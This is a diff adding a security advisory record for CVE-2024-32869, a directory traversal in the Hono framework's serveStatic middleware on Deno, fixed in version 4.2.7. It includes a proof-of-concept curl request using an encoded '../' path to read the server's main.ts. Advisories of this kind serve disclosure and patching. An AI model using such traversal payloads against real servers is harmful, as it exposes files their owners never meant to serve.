@@ -1,0 +1,80 @@
+advisory_id: GHSA-3mpf-rcc7-5347
+datasource_id: github_osv_importer_v2/GHSA-3mpf-rcc7-5347
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/04/GHSA-3mpf-rcc7-5347/GHSA-3mpf-rcc7-5347.json
+aliases:
+  - CVE-2024-32869
+summary: |
+  Hono vulnerable to Restricted Directory Traversal in serveStatic with deno
+  ### Summary
+
+  When using serveStatic with deno, it is possible to directory traverse where main.ts is located.
+
+  My environment is configured as per this tutorial
+  https://hono.dev/getting-started/deno
+
+  ### PoC
+
+  ```bash
+  $ tree
+  .
+  ├── deno.json
+  ├── deno.lock
+  ├── main.ts
+  ├── README.md
+  └── static
+      └── a.txt
+  ```
+
+  source
+
+  ```jsx
+  import { Hono } from 'https://deno.land/x/hono@v4.2.6/mod.ts'
+  import { serveStatic } from 'https://deno.land/x/hono@v4.2.6/middleware.ts'
+
+  const app = new Hono()
+  app.use('/static/*', serveStatic({ root: './' }))
+
+  Deno.serve(app.fetch)
+  ```
+
+  request
+
+  ```bash
+  curl localhost:8000/static/%2e%2e/main.ts
+  ```
+
+  response is content of main.ts
+
+  ### Impact
+
+  Unexpected files are retrieved.
+impacted_packages:
+  - purl: pkg:npm/hono
+    affected_versions: vers:npm/<4.2.7
+    fixed_versions: vers:npm/4.2.7
+severities:
+  - score: '5.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/04/GHSA-3mpf-rcc7-5347/GHSA-3mpf-rcc7-5347.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-22
+references:
+  - url: https://github.com/honojs/hono
+    reference_type:
+    reference_id:
+  - url: https://github.com/honojs/hono/commit/92e65fbb6e5e7372650e7690dbd84938432d9e65
+    reference_type:
+    reference_id:
+  - url: https://github.com/honojs/hono/security/advisories/GHSA-3mpf-rcc7-5347
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-32869
+    reference_type:
+    reference_id:
